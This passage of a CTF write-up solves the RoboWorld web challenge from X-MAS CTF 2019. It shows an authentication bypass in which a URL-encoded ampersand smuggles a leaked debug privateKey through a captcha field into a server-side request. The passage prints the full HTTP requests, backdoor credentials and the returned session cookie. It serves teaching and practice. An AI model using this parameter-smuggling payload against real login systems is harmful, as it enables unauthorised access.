class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    Captcha: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;captcha&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;captchaGenerateVerificationValue()&quot;</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;captcha_verification_value&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span> I am not a robot <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>As can be seen from the Devnote and the captchaGenerateVerificationValue function, the captcha verification seems to be broken and a random value is generated, which probably means it wont be checked at the backend. Lets try it out. Sending a random value instead of captcha does not make any difference and we pass the verification.</p><p>Request</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/captchaVerify?captchaUserValue=random&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challs.xmas.htsp.ro:11000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://challs.xmas.htsp.ro:11000</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challs.xmas.htsp.ro:11000/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 19 Dec 2019 11:00:01 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">allow</span></span></span><br></pre></td></tr></table></figure><p>It is also important to note that the server honours the first occurance of privateKey as that will be useful during exploitation. Hence below request would still pass the verification.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /captchaVerify?captchaUserValue=random&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E&amp;privateKey=1</span><br></pre></td></tr></table></figure><p>This allows us to set the captcha value to whatever we want so that we can manipulate the login request as that too contains the captcha value. I decided to try this out on local setup instead of beating on the CTF server as I have the source code available. Below is the changed code to try and replicate the backend.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, session, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#from captcha import verifyCaptchaValue</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    port = <span class="number">80</span></span><br><span class="line">    username = request.form.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> username</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;pass&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> password</span><br><span class="line">    captchaToken = request.form.get(<span class="string">&#x27;captcha_verification_value&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> captchaToken</span><br><span class="line">    privKey = <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span> <span class="comment">#redacted</span></span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://127.0.0.1:&#123;&#125;/captchaVerify?captchaUserValue=&#123;&#125;&amp;privateKey=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(port), captchaToken, privKey))</span><br><span class="line">    <span class="comment">#backdoored ;)))</span></span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&quot;backd00r&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;catsrcool&quot;</span> <span class="keyword">and</span> r.content == <span class="string">b&#x27;allow&#x27;</span>:</span><br><span class="line">        session[<span class="string">&#x27;logged&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;//redacted//&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@app.route(&#x27;/captchaVerify&#x27;)</span></span><br><span class="line"><span class="string">def captchaVerify():</span></span><br><span class="line"><span class="string">    #only 127.0.0.1 has access</span></span><br><span class="line"><span class="string">    if request.remote_addr != &quot;127.0.0.1&quot;:</span></span><br><span class="line"><span class="string">        return &quot;Access denied&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    token = request.args.get(&#x27;captchaUserValue&#x27;)</span></span><br><span class="line"><span class="string">    privKey = request.args.get(&#x27;privateKey&#x27;)</span></span><br><span class="line"><span class="string">    #TODO: remove debugging privkey for testing: 8EE86735658A9CE426EAF4E26BB0450E from captcha verification system</span></span><br><span class="line"><span class="string">    if(verifyCaptchaValue(token, privKey)):</span></span><br><span class="line"><span class="string">        return str(&quot;allow&quot;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return str(&quot;deny&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>The idea here is to manipulate the captcha_verification_value from the login request so that it will end up in captchaUserValue in line 22 above. That will allow us to utilize the vulnerability in captach verification and bypass the login. So a login payload of</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=backd00r&amp;pass=catsrcool&amp;captcha_verification_value=random&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E</span><br></pre></td></tr></table></figure><p>results into the GET request as below</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/captchaVerify?captchaUserValue=random&amp;privateKey=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure><p>We do not see the privateKey that we had passed. After some trial and errors the final login request looks like below. We need to URL encode the &amp; to make it parsable in post login request and visible in GET request later.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challs.xmas.htsp.ro:11000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>108</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://challs.xmas.htsp.ro:11000</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challs.xmas.htsp.ro:11000/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-pf"><span class="keyword">user</span>=backd00r&amp;<span class="built_in">pass</span>=catsrcool&amp;captcha_verification_value=<span class="keyword">random</span>%<span class="number">26</span>privateKey=<span class="number">8</span>EE86735658A9CE426EAF4E26BB0450E</span></span><br></pre></td></tr></table></figure><p>The above post body will result in the GET request as</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/captchaVerify?captchaUserValue=random&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E&amp;privateKey=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure><p>and the response returned to us is as follows:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> FOUND</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 19 Dec 2019 12:07:00 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>251</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://challs.xmas.htsp.ro:11000/dashboard_jidcc88574c</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Cookie</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session=eyJsb2dnZWQiOnRydWV9.Xftn5A.sdhb9kxBfoqHgBPvbz1rnTdA0ik; HttpOnly; Path=/</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Redirecting...<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Redirecting...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You should be redirected automatically to target URL: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/dashboard_jidcc88574c&quot;</span>&gt;</span>/dashboard_jidcc88574c<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.  If not click the link.</span></span><br></pre></td></tr></table></figure><p>We follow the redirect and are show the below page. The wtf.mp4 contains the flag as shown in the last image.<br><img src="/solving-roboworld-from-x-mas-ctf-2019/1.2.jpg" alt="alt"></p><p><img src="/solving-roboworld-from-x-mas-ctf-2019/1.3.jpg" alt="alt"></p><p>That was how I approached the problem and solved it. Feel free to ping me on twitter for feedback or queries.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> auth bypass </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
